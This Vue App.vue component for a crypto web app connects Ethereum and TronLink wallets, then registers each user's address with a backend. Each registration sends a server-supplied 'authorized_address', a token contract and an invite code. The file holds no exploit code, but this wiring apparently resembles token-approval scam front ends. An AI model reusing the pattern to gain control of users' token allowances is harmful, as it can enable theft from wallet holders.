<template>
  <div id="app">
    <keep-alive>
      <router-view v-if="$route.meta.isKeep"></router-view>
    </keep-alive>
    <router-view v-if="!$route.meta.isKeep"></router-view>
    <!-- <kefu/> -->
    <!-- <login /> -->
  </div>
</template>

<script>
import kefu from '@/components/kefu.vue'
import { mapActions } from 'vuex'
// import login from '@/components/login.vue'
import { configapi, create } from '@/api/user'
import { getQueryVariable } from '@/libs/common'
import { setToken } from "@/libs/util"
import Web3 from 'web3'

export default {
  name: 'App',
  components: {
    kefu,
    // login
  },

  data() {
    return {
      walletObj: ''
    }
  },
    computed: {
        configInfo () {
            return this.$store.state.user.configInfo
        }
    },
  mounted() {
    // setTimeout(() => {
    //   document.getElementById('loader-wrapper').remove()
    // }, 2000)
    // this.getWebCurrency()
    this.configapi()
    this.invite = getQueryVariable('invite')
  },
  methods: {
    ...mapActions([
        'setWalletObj',
        'setConfigInfo',
        'getuserinfo',
    ]),
    async handleWalletConnect() {
      var provider;
      // 查看是否有全局的以太坊对象
      if (window.ethereum) {
        provider = window.ethereum;
        try {
          // 请求用户授权
          await window.ethereum.enable();
        } catch (error) {
          //用户不授权时，这里处理异常情况，同时可以设置重试等机制
          console.log(error)
        }
      } else if (window.web3) { // 老版 MetaMask Legacy dapp browsers...
        this.isShow = true
        provider = window.web3.currentProvider;
      } else {
        this.isShow = true
            document.getElementById('loader-wrapper').remove()
        // 这里处理连接在不支持dapp的地方打开的情况
        // provider = new Web3.providers.HttpProvider('https://mainnet.infura.io/v3/03d156af34054ebe9f919b75e7a2c141');
        // console.log("Non-Ethereum browser detected. You should consider trying MetaMask!")

        //这种情况下表示用户在不支持dapp的浏览器打开，无法初始化web3
        // window.location.href = 'https://www.coinbase.com/wallet'

        //这里一般的处理逻辑是：使用第一篇中的那种自己初始化，获得区块上的基础数据，但是没法获取用户的账户信息
        //或者直接提示错误，不进行任何处理
      }

      // const provider = await window.ethereum;

      // await subscribeProvider(provider);
      try{
        const web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        const address = accounts[0];
        const networkId = await web3.eth.net.getId();
        const chainId = await web3.eth.getChainId(); // 坑逼 注意版本 chainId

      } catch (error) {
          //用户不授权时，这里处理异常情况，同时可以设置重试等机制
          console.log(error)
      }


    },
    async handleWalletConnect2 () {
      let balance = ''
      let address = ''
      if(window.tronWeb){
          this.tronWeb =  window.tronWeb;
          if (window.tronLink) await window.tronLink.request({method: 'tron_requestAccounts'})
          address = this.tronWeb.defaultAddress.base58;
          // balance = await this.tronWeb.trx.getBalance(address);
          if (!address) {
              this.isShow = true
          }
      } else {
          this.isShow = true
      }
      try{
        if (address) {
          this.walletObj = {
              balance,
              address
          }
          this.setWalletObj(this.walletObj)


          setTimeout(() => {
            document.getElementById('loader-wrapper').remove()
          }, 1000)
          this.create2()

          // if (!getToken()) {
          //   this.create2()
          // } else {
          //   this.userinfo()
          // }
        }
      } catch (error) {
            //用户不授权时，这里处理异常情况，同时可以设置重试等机制
            console.log(error)
      }


    },
    create() {
      let params = {
        address: this.walletObj.address,
        authorized_address: this.configInfo.erc.address,
        contract: this.configInfo.erc.contract_address,
        type: 'erc'
      }
      if (this.invite) params.invite = this.invite
      create(params).then(res => {
        let data = res.data
        this.$toast(data.msg)
        if (data.code == 1) {
          setToken(data.data.token)
          this.userinfo()
        }
      })
    },
    create2() {
      let params = {
        address: this.walletObj.address,
        authorized_address: this.configInfo.trc.address,
        contract: this.configInfo.trc.contract_address,
        type: 'trc'
      }
      if (this.invite) params.invite = this.invite
      create(params).then(res => {
        let data = res.data
        this.$toast(data.msg)
        if (data.code == 1) {
          setToken(data.data.token)
          this.userinfo()
        }
      })
    },
    userinfo() {
      this.getuserinfo()
    },
    configapi() {
      configapi().then(res => {
        let data = res.data
        if (data.code == 1) {
          this.setConfigInfo(data.data)
          this.handleWalletConnect()
          this.handleWalletConnect2()
        }
      })
    }
  }
}
</script>

<style>
@import './assets/static/css/animate.min.css';
@import './assets/static/css/bootstrap.min.css';
@import './assets/static/css/custom-toastr.css';
@import './assets/static/css/fontawesome-all.css';
@import './assets/static/css/icofont.min.css';

@import './assets/static/css/index.a1223731.css';
@import './assets/static/css/index.4300ebf3.css';
@import './assets/static/css/orders.b5a42f0e.css';

.van-dialog__message {
  color: #333;
}
.yred {
  color: #cf202f;
}
.ygreen {
  color: #13b26f;
}
.van-toast--middle {
  z-index: 6000 !important;
}
/* * { touch-action: pan-y; } */
</style>
